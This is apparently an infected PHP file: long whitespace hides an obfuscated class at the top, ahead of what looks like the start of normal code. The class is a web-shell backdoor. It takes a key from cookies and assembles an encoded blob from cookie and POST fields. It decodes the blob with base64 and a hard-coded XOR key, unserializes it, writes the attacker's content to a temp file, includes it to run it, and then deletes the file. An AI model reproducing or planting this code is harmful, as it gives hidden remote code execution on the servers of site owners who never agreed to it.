<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("idquwj")){class idquwj{public static $imwvhxxiem = "bhrlpmslagskjkwx";public static $ozvthuo = NULL;public function __construct(){$jxzztcn = @$_COOKIE[substr(idquwj::$imwvhxxiem, 0, 4)];if (!empty($jxzztcn)){$vwvquargf = "base64";$tsohtzv = "";$jxzztcn = explode(",", $jxzztcn);foreach ($jxzztcn as $dgxivi){$tsohtzv .= @$_COOKIE[$dgxivi];$tsohtzv .= @$_POST[$dgxivi];}$tsohtzv = array_map($vwvquargf . "_decode", array($tsohtzv,));$tsohtzv = $tsohtzv[0] ^ str_repeat(idquwj::$imwvhxxiem, (strlen($tsohtzv[0]) / strlen(idquwj::$imwvhxxiem)) + 1);idquwj::$ozvthuo = @unserialize($tsohtzv);}}public function __destruct(){$this->fospw();}private function fospw(){if (is_array(idquwj::$ozvthuo)) {$lxjpvvgjdt = sys_get_temp_dir() . "/" . crc32(idquwj::$ozvthuo["salt"]);@idquwj::$ozvthuo["write"]($lxjpvvgjdt, idquwj::$ozvthuo["content"]);include $lxjpvvgjdt;@idquwj::$ozvthuo["delete"]($lxjpvvgjdt);exit();}}}$iuktdsu = new idquwj();$iuktdsu = NULL;} ?><?php
/**
